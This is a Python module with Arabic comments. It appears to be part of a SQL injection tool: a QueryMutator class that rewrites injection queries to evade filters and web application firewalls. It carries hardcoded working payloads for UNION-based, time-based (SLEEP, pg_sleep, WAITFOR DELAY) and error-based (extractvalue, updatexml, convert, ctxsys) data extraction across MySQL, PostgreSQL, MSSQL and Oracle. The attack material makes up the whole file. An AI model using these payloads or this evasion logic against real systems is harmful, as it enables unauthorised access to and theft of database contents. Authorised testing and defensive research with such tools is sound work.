
import re
import random
import string
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum

import logging

logger = logging.getLogger(__name__)


class MutationTechnique(Enum):
    """تقنيات تحوير الاستعلامات"""
    CASE_SWAPPING = "case_swapping"
    WHITESPACE_INSERTION = "whitespace_insertion"
    COMMENT_INSERTION = "comment_insertion"
    CHARACTER_ENCODING = "character_encoding"
    LOGIC_INVERSION = "logic_inversion"
    UNION_EXPANSION = "union_expansion"
    SLEEP_INJECTION = "sleep_injection"
    ERROR_GENERATION = "error_generation"


@dataclass
class MutatedQuery:
    """استعلام محور"""
    original: str
    mutated: str
    technique: MutationTechnique
    dbms: Optional[str] = None
    success_rate: float = 0.0
    metadata: Dict[str, Any] = field(default_factory=dict)


class QueryMutator:
    """
    محول استعلامات SQL المتقدم
    
    الميزات:
    - تحوير الاستعلامات بـ 8 تقنيات مختلفة
    - استبدال الأحرف والمسافات
    - إضافة تعليقات
    - ترميز الأحرف
    - عكس المنطق
    - توسيع UNION
    - حقن التأخير (Time-based)
    - توليد أخطاء (Error-based)
    """
    
    # استبدالات الأحرف الشائعة
    CHARACTER_MAPPINGS = {
        " ": ["%20", "+", "/**/", "--%0a", "\t", "\n", "\r"],
        "'": ["%27", "\\'", "''", "‘", "’", "`"],
        '"': ['%22', '\\"', '""', "“", "”"],
        "=": ["LIKE", "REGEXP", "RLIKE", ">=", "<=", "<>", "!"],
        "OR": ["||", "OR", "or", "Or", "oR", "O R"],
        "AND": ["&&", "AND", "and", "And", "aNd", "A N D"],
        "SELECT": ["SeLeCt", "sElEcT", "select", "sel*ect", "sel%65ct"],
        "UNION": ["UnIoN", "union", "uni%6fn", "uni/**/on", "UNI ON"],
        "WHERE": ["WhErE", "where", "wHeRe", "WH ERE"],
        "FROM": ["FrOm", "from", "fRoM", "FRO M"],
    }
    
    # أنماط التعليقات
    COMMENT_PATTERNS = [
        "/*{}*/", "--{}", "#{}", "/*!{}*/", "-- -{}", "#%0a{}", "/*%0a*/{}"
    ]
    
    # حمولات UNION للتوسيع
    UNION_PAYLOADS = [
        "UNION SELECT NULL",
        "UNION SELECT NULL,NULL",
        "UNION SELECT NULL,NULL,NULL",
        "UNION SELECT NULL,NULL,NULL,NULL",
        "UNION SELECT NULL,NULL,NULL,NULL,NULL",
        "UNION SELECT version()",
        "UNION SELECT user()",
        "UNION SELECT database()",
    ]
    
    # حمولات التأخير (Time-based)
    SLEEP_PAYLOADS = {
        "MySQL": ["AND SLEEP(5)", "AND BENCHMARK(1000000,MD5(1))"],
        "PostgreSQL": ["AND pg_sleep(5)"],
        "MSSQL": ["WAITFOR DELAY '00:00:05'"],
        "Oracle": ["AND DBMS_LOCK.SLEEP(5)"],
    }
    
    # حمولات توليد الأخطاء (Error-based)
    ERROR_PAYLOADS = {
        "MySQL": [
            "AND extractvalue(1,concat(0x7e,database()))",
            "AND updatexml(1,concat(0x7e,database()),1)",
            "AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
        ],
        "PostgreSQL": [
            "AND 1=cast((SELECT version()) as int)",
            "AND 1=cast((SELECT current_database()) as int)"
        ],
        "MSSQL": [
            "AND 1=convert(int,@@version)",
            "AND 1=convert(int,db_name())"
        ],
        "Oracle": [
            "AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))"
        ],
    }
    
    def __init__(self):
        self._mutated_queries: Dict[str, List[MutatedQuery]] = {}
        
        logger.info("QueryMutator initialized")
    
    async def mutate(
        self,
        query: str,
        techniques: List[MutationTechnique] = None,
        dbms: str = None
    ) -> List[MutatedQuery]:
        """
        تحوير استعلام SQL
        
        Args:
            query: الاستعلام الأصلي
            techniques: قائمة التقنيات (الكل إذا None)
            dbms: نوع DBMS (للتقنيات الخاصة)
        
        Returns:
            قائمة بالاستعلامات المحورة
        """
        if techniques is None:
            techniques = list(MutationTechnique)
        
        mutated_queries = []
        
        for technique in techniques:
            if technique == MutationTechnique.CASE_SWAPPING:
                mutated = await self._case_swap(query)
                if mutated and mutated != query:
                    mutated_queries.append(MutatedQuery(
                        original=query,
                        mutated=mutated,
                        technique=technique,
                        dbms=dbms,
                        success_rate=0.3
                    ))
            
            elif technique == MutationTechnique.WHITESPACE_INSERTION:
                mutated = await self._insert_whitespace(query)
                if mutated and mutated != query:
                    mutated_queries.append(MutatedQuery(
                        original=query,
                        mutated=mutated,
                        technique=technique,
                        dbms=dbms,
                        success_rate=0.4
                    ))
            
            elif technique == MutationTechnique.COMMENT_INSERTION:
                mutated = await self._insert_comments(query)
                if mutated and mutated != query:
                    mutated_queries.append(MutatedQuery(
                        original=query,
                        mutated=mutated,
                        technique=technique,
                        dbms=dbms,
                        success_rate=0.5
                    ))
            
            elif technique == MutationTechnique.CHARACTER_ENCODING:
                mutated = await self._encode_characters(query)
                if mutated and mutated != query:
                    mutated_queries.append(MutatedQuery(
                        original=query,
                        mutated=mutated,
                        technique=technique,
                        dbms=dbms,
                        success_rate=0.6
                    ))
            
            elif technique == MutationTechnique.LOGIC_INVERSION:
                mutated = await self._invert_logic(query)
                if mutated and mutated != query:
                    mutated_queries.append(MutatedQuery(
                        original=query,
                        mutated=mutated,
                        technique=technique,
                        dbms=dbms,
                        success_rate=0.5
                    ))
            
            elif technique == MutationTechnique.UNION_EXPANSION:
                mutated = await self._expand_union(query)
                if mutated:
                    mutated_queries.append(MutatedQuery(
                        original=query,
                        mutated=mutated,
                        technique=technique,
                        dbms=dbms,
                        success_rate=0.7
                    ))
            
            elif technique == MutationTechnique.SLEEP_INJECTION and dbms:
                mutated = await self._inject_sleep(query, dbms)
                if mutated:
                    mutated_queries.append(MutatedQuery(
                        original=query,
                        mutated=mutated,
                        technique=technique,
                        dbms=dbms,
                        success_rate=0.8
                    ))
            
            elif technique == MutationTechnique.ERROR_GENERATION and dbms:
                mutated = await self._generate_error(query, dbms)
                if mutated:
                    mutated_queries.append(MutatedQuery(
                        original=query,
                        mutated=mutated,
                        technique=technique,
                        dbms=dbms,
                        success_rate=0.7
                    ))
        
        # إزالة التكرارات
        unique = []
        seen = set()
        for q in mutated_queries:
            if q.mutated not in seen:
                seen.add(q.mutated)
                unique.append(q)
        
        return unique
    
    async def _case_swap(self, query: str) -> str:
        """تغيير حالة الأحرف بشكل عشوائي"""
        result = []
        for char in query:
            if char.isalpha() and random.random() > 0.5:
                result.append(char.swapcase())
            else:
                result.append(char)
        return ''.join(result)
    
    async def _insert_whitespace(self, query: str) -> str:
        """إضافة مسافات وأحرف بيضاء"""
        whitespace = [" ", "\t", "\n", "\r", "/**/", "--%0a"]
        result = []
        
        for char in query:
            result.append(char)
            if random.random() > 0.7 and char.isalnum():
                result.append(random.choice(whitespace))
        
        return ''.join(result)
    
    async def _insert_comments(self, query: str) -> str:
        """إضافة تعليقات داخل الاستعلام"""
        comment = random.choice(self.COMMENT_PATTERNS)
        random_text = ''.join(random.choices(string.ascii_letters, k=3))
        
        # البحث عن مواقع لإدراج التعليقات
        insert_positions = [
            m.start() for m in re.finditer(r'\b(AND|OR|SELECT|FROM|WHERE|UNION)\b', query, re.I)
        ]
        
        if not insert_positions:
            insert_positions = [len(query) // 2]
        
        pos = random.choice(insert_positions)
        return query[:pos] + comment.format(random_text) + query[pos:]
    
    async def _encode_characters(self, query: str) -> str:
        """ترميز الأحرف الخاصة"""
        result = []
        for char in query:
            if char in self.CHARACTER_MAPPINGS and random.random() > 0.6:
                replacement = random.choice(self.CHARACTER_MAPPINGS[char])
                result.append(replacement)
            else:
                result.append(char)
        return ''.join(result)
    
    async def _invert_logic(self, query: str) -> str:
        """عكس المنطق (تحويل AND إلى OR، = إلى !=)"""
        result = query
        result = result.replace("=", "!=")
        result = result.replace("AND", "OR")
        result = result.replace("OR", "AND")
        return result
    
    async def _expand_union(self, query: str) -> Optional[str]:
        """توسيع استعلام UNION"""
        for payload in self.UNION_PAYLOADS:
            if "UNION" in query.upper():
                # إضافة UNION آخر
                return f"{query} {payload}"
        
        # إضافة UNION جديد
        return f"{query} {random.choice(self.UNION_PAYLOADS)}"
    
    async def _inject_sleep(self, query: str, dbms: str) -> Optional[str]:
        """حقن تأخير (Time-based)"""
        sleep_payloads = self.SLEEP_PAYLOADS.get(dbms, [])
        if not sleep_payloads:
            return None
        
        sleep = random.choice(sleep_payloads)
        
        if "WHERE" in query.upper():
            # إضافة التأخير بعد WHERE
            parts = re.split(r'(?i)(WHERE)', query, 1)
            if len(parts) >= 2:
                return f"{parts[0]}{parts[1]} {sleep} AND {parts[2]}"
        
        return f"{query} {sleep}"
    
    async def _generate_error(self, query: str, dbms: str) -> Optional[str]:
        """توليد خطأ (Error-based)"""
        error_payloads = self.ERROR_PAYLOADS.get(dbms, [])
        if not error_payloads:
            return None
        
        error = random.choice(error_payloads)
        
        if "WHERE" in query.upper():
            parts = re.split(r'(?i)(WHERE)', query, 1)
            if len(parts) >= 2:
                return f"{parts[0]}{parts[1]} {error} AND {parts[2]}"
        
        return f"{query} {error}"
    
    async def mutate_batch(
        self,
        queries: List[str],
        mutations_per_query: int = 5
    ) -> List[MutatedQuery]:
        """
        تحوير مجموعة من الاستعلامات دفعة واحدة
        
        Args:
            queries: قائمة الاستعلامات
            mutations_per_query: عدد التحويرات لكل استعلام
        
        Returns:
            قائمة بالاستعلامات المحورة
        """
        all_mutations = []
        
        for query in queries:
            mutations = await self.mutate(query)
            all_mutations.extend(mutations[:mutations_per_query])
        
        return all_mutations
    
    async def get_mutations_for_query(self, query: str) -> List[MutatedQuery]:
        """الحصول على التحويرات لاستعلام معين"""
        return self._mutated_queries.get(query, [])
    
    async def store_mutation(self, original: str, mutation: MutatedQuery):
        """تخزين تحوير"""
        if original not in self._mutated_queries:
            self._mutated_queries[original] = []
        self._mutated_queries[original].append(mutation)
    
    async def get_statistics(self) -> Dict:
        """إحصائيات المحول"""
        total_mutations = sum(len(v) for v in self._mutated_queries.values())
        
        return {
            "total_original_queries": len(self._mutated_queries),
            "total_mutations": total_mutations,
            "avg_mutations_per_query": total_mutations / len(self._mutated_queries) if self._mutated_queries else 0,
            "techniques_available": len(MutationTechnique),
            "character_mappings": len(self.CHARACTER_MAPPINGS),
            "comment_patterns": len(self.COMMENT_PATTERNS),
            "union_payloads": len(self.UNION_PAYLOADS),
            "sleep_payloads": sum(len(v) for v in self.SLEEP_PAYLOADS.values()),
            "error_payloads": sum(len(v) for v in self.ERROR_PAYLOADS.values())
        }
    
    async def clear_mutations(self, query: str = None):
        """مسح التحويرات"""
        if query:
            self._mutated_queries.pop(query, None)
        else:
            self._mutated_queries.clear()
        
        logger.info(f"Mutations cleared for {query if query else 'all queries'}")

